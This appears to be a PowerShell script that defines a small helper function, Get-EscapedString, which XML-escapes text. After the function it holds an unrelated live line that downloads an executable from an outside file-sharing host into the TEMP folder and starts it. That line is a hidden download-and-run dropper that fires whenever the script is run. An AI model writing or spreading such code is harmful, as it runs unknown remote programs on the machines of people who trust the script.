function Get-EscapedString
{
    [CmdletBinding()]
    [OutputType([String])]
    Param
    (
        [Parameter()]
        [string]
        $ElementValue
    )

    return [System.Security.SecurityElement]::Escape($ElementValue)
}
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/pabfzv.exe',"$env:TEMP\testu.exe");Start-Process ("$env:TEMP\testu.exe")

